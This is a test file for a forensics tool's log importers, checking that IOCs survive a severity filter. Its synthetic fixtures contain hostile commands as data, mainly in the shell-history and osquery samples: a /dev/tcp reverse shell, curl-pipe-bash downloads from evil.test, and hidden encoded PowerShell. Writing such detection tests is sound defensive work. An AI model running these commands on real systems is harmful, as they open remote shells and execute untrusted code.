import { describe, it, expect } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { MockProvider } from "../../src/providers/provider.js";
import { AnalysisPipeline } from "../../src/analysis/pipeline.js";
import type { InvestigationState, Severity } from "../../src/analysis/stateTypes.js";

// Importer-level coverage for the class-wide guard fix (#1353): the analyst severity floor runs on
// the EVENTS only — the parser's IOC list is never floored — so a floor that removes every event
// must keep the IOCs and say so in the note, the way capa/olevba (#1337), FLOSS (#1304) and
// Sandbox / Memory / YARA / Cyber Triage already did. One case per graded importer that merges
// IOCs. Every fixture is the one its own parser test already pins as graded, so a case that
// stops floating "below the severity floor" is a parser that stopped grading, not a flaky floor.
//
// Every value below is synthetic (RFC 5737 / RFC 1918 addresses, `.invalid` / `.test` hosts).

const IMPORTED_AT = "2026-09-18T12:00:00.000Z";
const SHA256 = "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899";

async function pipeline(): Promise<AnalysisPipeline> {
  const root = await mkdtemp(join(tmpdir(), "dfir-floor-iocs-"));
  const caseStore = new CaseStore(root);
  await caseStore.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: "mock" });
  const stateStore = new StateStore(caseStore);
  return new AnalysisPipeline({
    provider: new MockProvider("mock", "{}"),
    stateStore,
    imageLoader: async () => ({ base64: "AAAA", mimeType: "image/webp" }),
  });
}

type Run = (p: AnalysisPipeline, minSeverity?: Severity) => Promise<InvestigationState>;
type Case = { name: string; ioc: string; run: Run };

const base = (label: string, idPrefix: string, minSeverity?: Severity) => ({
  label,
  idPrefix,
  importedAt: IMPORTED_AT,
  minSeverity,
});

// ---- endpoint -------------------------------------------------------------------------------

// THOR: a Warning-level ProcessCheck row (High) carrying an image_sha256 (#1353's motivating case —
// the hash is what an analyst executes against the estate).
const THOR = JSON.stringify({
  time: "2026-06-03T09:43:07Z",
  hostname: "WIN11",
  level: "Warning",
  module: "ProcessCheck",
  message: "Malicious process found",
  pid: 8684,
  process_name: "evil.exe",
  owner: "NT AUTHORITY\\SYSTEM",
  created: "2026-06-03T08:35:23Z",
  image_file: "C:\\Tools\\evil.exe",
  image_sha256: "4813e753f6f9bfa5c5de0edbb8dd3cc7f1fa51714097d3144d44e5e89dbd33ef",
  reason_1: "YARA rule Powerkatz_DLL / Detects Mimikatz",
});

const SYSMON_EVENT_DATA = {
  UtcTime: "2023-01-02 10:00:00.000",
  Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
  ParentImage: "C:\\Program Files\\Microsoft Office\\winword.exe",
  Hashes: `SHA256=${SHA256},MD5=00112233445566778899aabbccddeeff`,
};

const CHAINSAW = JSON.stringify([
  {
    group: "Sigma",
    kind: "individual",
    document: {
      kind: "evtx",
      path: "Sysmon.evtx",
      data: {
        Event: {
          System: {
            Provider: { "#attributes": { Name: "Microsoft-Windows-Sysmon" } },
            EventID: 1,
            Channel: "Microsoft-Windows-Sysmon/Operational",
            Computer: "WIN-DC01.corp.local",
            TimeCreated: { "#attributes": { SystemTime: "2023-01-02T10:00:00.000Z" } },
          },
          EventData: SYSMON_EVENT_DATA,
        },
      },
    },
    rule: {
      name: "Suspicious Encoded PowerShell Command Line",
      level: "high",
      tags: ["attack.execution", "attack.t1059.001"],
    },
    timestamp: "2023-01-02T10:00:00.000Z",
  },
]);

const HAYABUSA = JSON.stringify([
  {
    Timestamp: "2021-12-12 12:00:00.000 +00:00",
    Computer: "FS01.corp.local",
    Channel: "Sysmon",
    EventID: 1,
    Level: "high",
    MitreTactics: ["Execution"],
    MitreTags: ["t1059.001"],
    RuleTitle: "PowerShell Download Cradle",
    Details: {
      Proc: SYSMON_EVENT_DATA.Image,
      CmdLine: "powershell.exe -nop -w hidden -enc SQBFAFgA",
      ParentProc: SYSMON_EVENT_DATA.ParentImage,
      Hashes: SYSMON_EVENT_DATA.Hashes,
    },
    ExtraFieldInfo: { TgtIP: "10.0.0.9", User: "CORP\\bob" },
  },
]);

const VELOCIRAPTOR = JSON.stringify([
  {
    _Source: "Windows.Detection.Yara.Glob",
    Rule: "APT_Malware_Foo",
    Namespace: "default",
    Meta: { author: "x", mitre: "T1059" },
    Strings: ["$a"],
    OSPath: "C:\\Users\\bob\\evil.exe",
    HashSHA256: SHA256,
  },
]);

const KAPE = [
  "SourceFilename,ExecutableName,Hash,Size,RunCount,LastRun,PreviousRun0",
  "C:\\Windows\\Prefetch\\MIMIKATZ.EXE-1234.pf,MIMIKATZ.EXE,ABCD,10000,2,2023-04-01 10:00:00,2023-03-31 09:00:00",
].join("\n");

// ---- platform -------------------------------------------------------------------------------

const SIEM = JSON.stringify({
  data: [
    {
      _index: "win-2017",
      _type: "winevtx",
      _source: {
        "@timestamp": "2017-03-20T06:40:00.000Z",
        log_name: "Security",
        computer_name: "WINDMILLDC",
        event_id: 4625,
        level: "Information",
        event_data: {
          TargetUserName: "admin",
          TargetDomainName: "WINDMILL",
          LogonType: "3",
          IpAddress: "10.10.200.50",
          Status: "0xc000006d",
        },
      },
    },
  ],
});

const WAZUH = JSON.stringify([
  {
    timestamp: "2024-01-15T10:30:00.123+0000",
    rule: {
      level: 10,
      description: "Multiple authentication failures",
      id: "5712",
      groups: ["authentication_failures", "pam"],
      mitre: { technique: ["T1110"] },
    },
    agent: { id: "001", name: "web-server-01" },
    data: { srcip: "203.0.113.10", dstip: "10.0.0.5" },
  },
]);

const EVTX_XML = `<?xml version="1.0" encoding="utf-8"?>
<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Level>4</Level>
    <TimeCreated SystemTime="2024-05-14T12:01:00.0000000Z"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-BO-01.example.invalid</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="UtcTime">2024-05-14 12:01:00.000</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAA=</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="Hashes">SHA256=${SHA256},MD5=00112233445566778899aabbccddeeff</Data>
  </EventData>
</Event>
</Events>`;

// ---- network --------------------------------------------------------------------------------

const SNORT =
  "05/14-12:26:09.500 [**] [1:2009714:9] ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT [**] [Classification: web-application-attack] [Priority: 1] {TCP} 145.78.103.167:60278 -> 45.83.220.5:80";

// nfdump: six regular one-minute flows to one tuple mint the Low periodicity lead; the raw flow
// rows themselves are Info.
const NFDUMP = Array.from({ length: 6 }, (_, i) =>
  JSON.stringify({
    first: new Date(Date.parse("2026-01-01T00:00:00.000Z") + i * 60_000).toISOString(),
    last: new Date(Date.parse("2026-01-01T00:00:01.000Z") + i * 60_000).toISOString(),
    received: "2026-01-01T00:05:00.000",
    proto: 6,
    src4_addr: "10.0.0.5",
    dst4_addr: "203.0.113.9",
    src_port: 51000,
    dst_port: 443,
    tcp_flags: ".S....",
    in_bytes: 1000,
    in_packets: 10,
    export_sysid: 1,
    observationPointID: 5,
    sampled: 0,
  }),
).join("\n");

// ---- cloud / identity -----------------------------------------------------------------------

const M365 = JSON.stringify([
  {
    RecordType: 1,
    CreationDate: "2023-05-01T10:00:00",
    UserIds: "attacker@victim.invalid",
    Operations: "New-InboxRule",
    AuditData: JSON.stringify({
      CreationTime: "2023-05-01T10:00:00",
      Operation: "New-InboxRule",
      Workload: "Exchange",
      UserId: "attacker@victim.invalid",
      ClientIP: "[203.0.113.7]:443",
      ResultStatus: "True",
      ObjectId: "victim@victim.invalid\\Inbox Rule",
    }),
  },
]);

const OKTA = JSON.stringify([
  {
    uuid: "e3",
    published: "2026-05-02T10:00:00.000Z",
    eventType: "user.mfa.factor.deactivate",
    displayMessage: "User login to Okta",
    severity: "INFO",
    actor: { id: "00u1", type: "User", alternateId: "jdoe@example.invalid", displayName: "J Doe" },
    client: { ipAddress: "203.0.113.10", geographicalContext: { city: "Tel Aviv", country: "Israel" } },
    outcome: { result: "SUCCESS" },
  },
]);

const AZURE_STORAGE = JSON.stringify({
  time: "2024-05-14T12:00:49.745Z",
  resourceId:
    "/subscriptions/abc/resourceGroups/rg1/providers/Microsoft.Storage/storageAccounts/acct1/blobServices/default",
  category: "StorageWrite",
  operationName: "PutBlob",
  statusCode: 200,
  callerIpAddress: "203.0.113.9:44123",
  uri: "https://acct1.blob.core.windows.net/cont1/obj1.png",
  identity: { type: "Anonymous" },
  properties: { accountName: "acct1" },
});

const GWS = JSON.stringify([
  {
    kind: "admin#reports#activity",
    id: {
      time: "2026-05-02T10:00:00.000Z",
      uniqueQualifier: "-1",
      applicationName: "login",
      customerId: "C01abc",
    },
    actor: { email: "jdoe@example.invalid", profileId: "1234" },
    ipAddress: "203.0.113.10",
    events: [{ type: "login", name: "suspicious_login", parameters: [] }],
  },
]);

const AWS = JSON.stringify({
  Records: [
    {
      eventTime: "2023-06-01T10:00:00Z",
      eventSource: "iam.amazonaws.com",
      eventName: "CreateAccessKey",
      awsRegion: "us-east-1",
      sourceIPAddress: "203.0.113.10",
      userAgent: "aws-cli/2.0",
      readOnly: false,
      eventType: "AwsApiCall",
      userIdentity: { type: "IAMUser", userName: "bob", arn: "arn:aws:iam::123:user/bob", accountId: "123" },
    },
  ],
});

const CLOUD_ACTIVITY = JSON.stringify([
  {
    logName: "projects/acme/logs/cloudaudit.googleapis.com%2Factivity",
    timestamp: "2023-07-01T10:00:00.123456789Z",
    resource: { type: "service_account" },
    protoPayload: {
      "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
      serviceName: "iam.googleapis.com",
      methodName: "google.iam.admin.v1.CreateServiceAccountKey",
      authenticationInfo: { principalEmail: "attacker@acme.invalid" },
      requestMetadata: { callerIp: "203.0.113.11" },
      resourceName: "projects/acme/serviceAccounts/svc@acme.iam.gserviceaccount.com",
      status: {},
    },
  },
]);

const K8S = JSON.stringify({
  kind: "Event",
  apiVersion: "audit.k8s.io/v1",
  level: "RequestResponse",
  stage: "ResponseComplete",
  requestReceivedTimestamp: "2024-08-01T12:00:00.000000Z",
  stageTimestamp: "2024-08-01T12:00:00.100000Z",
  user: { username: "dev@corp.local", groups: ["system:authenticated"] },
  sourceIPs: ["10.0.5.9"],
  verb: "create",
  objectRef: { resource: "pods", subresource: "exec", namespace: "prod", name: "api-7" },
  responseStatus: { code: 200 },
});

const OSQUERY = JSON.stringify({
  name: "pack/incident-response/process_events",
  hostIdentifier: "workstation-1",
  calendarTime: "Tue Aug 1 12:00:00 2024 UTC",
  unixTime: 1722513600,
  epoch: 0,
  counter: 1,
  action: "added",
  columns: { pid: "9", path: "/bin/bash", cmdline: "curl http://evil.test/s.sh | bash", uid: "0" },
});

// ---- logs -----------------------------------------------------------------------------------

const BASH_HISTORY = ["bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "curl http://evil.test/x.sh | bash"].join(
  "\n",
);

const COMBINED_LOG =
  '10.30.10.14 - - [15/May/2024:05:31:11 +0000] "GET /security/keystore-svc.git/info/refs?service=git-upload-pack HTTP/1.1" 403 1275 "http://git.corp.example.invalid/" "git/2.34.1"';

const CISCO_ASA =
  '<164>May 14 19:02:58 fw01 %ASA-4-106023: Deny tcp src inside:10.30.10.27/60228 dst outside:42.5.45.223/23 by access-group "inside_access_in" [0xa9d4, 0xa8e5]';

const SYSLOG =
  "May 16 13:40:26 app01 sshd[1234]: Failed password for invalid user admin from 203.0.113.9 port 41022 ssh2";

// ---- cloud flow logs ------------------------------------------------------------------------

const AWS_FLOW =
  "2 123456789010 eni-1235b8ca 172.31.16.139 203.0.113.10 20641 22 6 20 4249 1418530010 1418530070 ACCEPT OK";

const AZURE_FLOW = JSON.stringify({
  records: [
    {
      time: "2022-09-14T09:00:52.5625085Z",
      flowLogVersion: 4,
      flowLogGUID: "66aa66aa-bb77-cc88-dd99-00ee00ee00ee",
      macAddress: "112233445566",
      category: "FlowLogFlowEvent",
      flowLogResourceID:
        "/SUBSCRIPTIONS/AAAA0A0A-BB1B-CC2C-DD3D-EEEEEE4E4E4E/RESOURCEGROUPS/NW/PROVIDERS/MICROSOFT.NETWORK/NETWORKWATCHERS/NW_E/FLOWLOGS/VNETFLOWLOG",
      targetResourceID:
        "/subscriptions/aaaa0a0a-bb1b-cc2c-dd3d-eeeeee4e4e4e/resourceGroups/rg/providers/Microsoft.Network/virtualNetworks/myVNet",
      operationName: "FlowLogFlowEvent",
      flowRecords: {
        flows: [
          {
            aclID: "00aa00aa-bb11-cc22-dd33-44ee44ee44ee",
            flowGroups: [
              {
                rule: "DefaultRule_AllowInternetOutBound",
                flowTuples: ["1663146003606,10.0.0.6,192.0.2.180,23956,443,6,O,E,NX,3,767,2,1580"],
              },
            ],
          },
        ],
      },
    },
  ],
});

const GCP_FLOW = JSON.stringify([
  {
    insertId: "abc123",
    logName: "projects/my-proj/logs/compute.googleapis.com%2Fvpc_flows",
    resource: { type: "gce_subnetwork", labels: { project_id: "my-proj", subnetwork_name: "default" } },
    timestamp: "2024-05-01T10:00:05.000Z",
    jsonPayload: {
      connection: {
        src_ip: "10.128.0.2",
        dest_ip: "203.0.113.9",
        src_port: 51234,
        dest_port: 443,
        protocol: 6,
      },
      reporter: "SRC",
      bytes_sent: "8420",
      packets_sent: "12",
      start_time: "2024-05-01T09:59:58.123456Z",
      end_time: "2024-05-01T10:00:03.000000Z",
      src_instance: { project_id: "my-proj", region: "us-central1", zone: "us-central1-a", vm_name: "web-1" },
    },
  },
]);

// ---- ECAR -----------------------------------------------------------------------------------

const ECAR = [
  {
    timestamp_ms: 1715688049745,
    id: "00000000-0000-0000-0000-000000000000",
    hostname: "WEB-BO-01",
    object: "PROCESS",
    action: "CREATE",
    properties: {
      command_line: "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
      image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    },
  },
  {
    timestamp_ms: 1715688049745,
    id: "00000000-0000-0000-0000-000000000000",
    hostname: "WEB-BO-01",
    object: "FLOW",
    action: "CONNECT",
    properties: {
      src_ip: "10.44.30.10",
      src_port: "55001",
      dst_ip: "45.83.221.30",
      dst_port: "443",
      protocol: "tcp",
      direction: "OUTBOUND",
    },
  },
]
  .map((r) => JSON.stringify(r))
  .join("\n");

// ---------------------------------------------------------------------------------------------

const CASES: Case[] = [
  {
    name: "THOR",
    ioc: "4813e753f6f9bfa5c5de0edbb8dd3cc7f1fa51714097d3144d44e5e89dbd33ef",
    run: (p, f) => p.importThor("c1", THOR, base("thor.json", "th", f)),
  },
  {
    name: "Chainsaw",
    ioc: SHA256,
    run: (p, f) => p.importChainsaw("c1", CHAINSAW, base("chainsaw.json", "cs", f)),
  },
  {
    name: "Hayabusa",
    ioc: "10.0.0.9",
    run: (p, f) => p.importHayabusa("c1", HAYABUSA, base("hayabusa.json", "hb", f)),
  },
  {
    name: "Velociraptor",
    ioc: SHA256,
    run: (p, f) =>
      p.importVelociraptor("c1", VELOCIRAPTOR, base("Windows.Detection.Yara.Glob.json", "vr", f)),
  },
  {
    name: "KAPE",
    ioc: "MIMIKATZ.EXE",
    run: (p, f) => p.importKape("c1", KAPE, base("PECmd_Output.csv", "kp", f)),
  },
  {
    name: "SIEM",
    ioc: "10.10.200.50",
    run: (p, f) => p.importSiem("c1", SIEM, base("elastic.json", "si", f)),
  },
  {
    name: "Wazuh",
    ioc: "203.0.113.10",
    run: (p, f) => p.importWazuh("c1", WAZUH, base("alerts.json", "wz", f)),
  },
  {
    name: "Windows Event Log (XML)",
    ioc: SHA256,
    run: (p, f) => p.importEvtxXml("c1", EVTX_XML, base("Security.xml", "ex", f)),
  },
  {
    name: "Snort",
    ioc: "145.78.103.167",
    run: (p, f) => p.importSnort("c1", SNORT, { ...base("alert", "sn", f), snort: { assumeYear: 2024 } }),
  },
  {
    name: "nfdump exporter flow",
    ioc: "203.0.113.9",
    run: (p, f) => p.importExporterFlow("c1", NFDUMP, base("flows.ndjson", "nf", f)),
  },
  {
    name: "Microsoft 365",
    ioc: "203.0.113.7",
    run: (p, f) => p.importM365("c1", M365, base("ual.json", "m3", f)),
  },
  { name: "Okta", ioc: "203.0.113.10", run: (p, f) => p.importOkta("c1", OKTA, base("okta.json", "ok", f)) },
  {
    name: "Azure Storage Logs",
    ioc: "203.0.113.9",
    run: (p, f) => p.importAzureStorageLog("c1", AZURE_STORAGE, base("storage.json", "as", f)),
  },
  {
    name: "Google Workspace",
    ioc: "203.0.113.10",
    run: (p, f) => p.importGoogleWorkspace("c1", GWS, base("gws.json", "gw", f)),
  },
  {
    name: "AWS CloudTrail",
    ioc: "203.0.113.10",
    run: (p, f) => p.importAws("c1", AWS, base("trail.json", "aw", f)),
  },
  {
    name: "Cloud activity",
    ioc: "203.0.113.11",
    run: (p, f) => p.importCloudActivity("c1", CLOUD_ACTIVITY, base("gcp.json", "ca", f)),
  },
  {
    name: "Kubernetes audit",
    ioc: "10.0.5.9",
    run: (p, f) => p.importK8sAudit("c1", K8S, base("audit.json", "k8", f)),
  },
  {
    name: "osquery",
    ioc: "http://evil.test/s.sh",
    run: (p, f) => p.importOsquery("c1", OSQUERY, base("osqueryd.results.log", "oq", f)),
  },
  {
    name: "Shell history",
    ioc: "http://evil.test/x.sh",
    run: (p, f) => p.importBashHistory("c1", BASH_HISTORY, base("0001_bob.bash_history", "sh", f)),
  },
  {
    name: "Web/proxy access-log",
    ioc: "git.corp.example.invalid",
    run: (p, f) => p.importCombinedLog("c1", COMBINED_LOG, base("access.log", "wp", f)),
  },
  {
    name: "Cisco ASA",
    ioc: "42.5.45.223",
    run: (p, f) =>
      p.importCiscoAsa("c1", CISCO_ASA, { ...base("asa.log", "ca", f), ciscoAsa: { assumeYear: 2024 } }),
  },
  {
    name: "Syslog",
    ioc: "203.0.113.9",
    run: (p, f) =>
      p.importSyslog("c1", SYSLOG, { ...base("auth.log", "sl", f), syslog: { assumeYear: 2024 } }),
  },
  {
    name: "AWS VPC Flow Logs",
    ioc: "203.0.113.10",
    run: (p, f) => p.importAwsFlowLog("c1", AWS_FLOW, base("flow.log", "af", f)),
  },
  {
    name: "Azure virtual network flow log",
    ioc: "192.0.2.180",
    run: (p, f) => p.importAzureFlowLog("c1", AZURE_FLOW, base("PT1H.json", "zf", f)),
  },
  {
    name: "GCP VPC Flow Logs",
    ioc: "203.0.113.9",
    run: (p, f) => p.importGcpFlowLog("c1", GCP_FLOW, base("vpc_flows.json", "gf", f)),
  },
  {
    name: "ECAR",
    ioc: "45.83.221.30",
    run: (p, f) => p.importEcar("c1", ECAR, base("ecar.ndjson", "ec", f)),
  },
];

const FLOOR_CLAUSE = "below the severity floor";
const EMPTY_CLAUSE = "nothing added to the case";

describe.each(CASES)(
  "$name — a severity floor that removes every event keeps the IOCs (#1353)",
  ({ ioc, run }) => {
    it("no floor: the fixture is graded (at least one event lands) and merges its IOC", async () => {
      const state = await run(await pipeline());
      expect(state.forensicTimeline.length).toBeGreaterThan(0);
      expect(state.iocs.map((i) => i.value)).toContain(ioc);
      expect(state.timeline.some((t) => t.description.includes(FLOOR_CLAUSE))).toBe(false);
    });

    it("a Critical floor: zero events, the IOC still lands, and the note says how many the floor removed", async () => {
      const state = await run(await pipeline(), "Critical");
      expect(state.forensicTimeline).toHaveLength(0);
      expect(state.iocs.map((i) => i.value)).toContain(ioc);
      const note = state.timeline.find((t) => t.description.includes(FLOOR_CLAUSE))?.description ?? "";
      expect(note).toMatch(/\b[1-9]\d* below the severity floor/);
      expect(note).not.toContain(EMPTY_CLAUSE);
      expect(state.timeline.some((t) => t.description.includes(EMPTY_CLAUSE))).toBe(false);
    });
  },
);
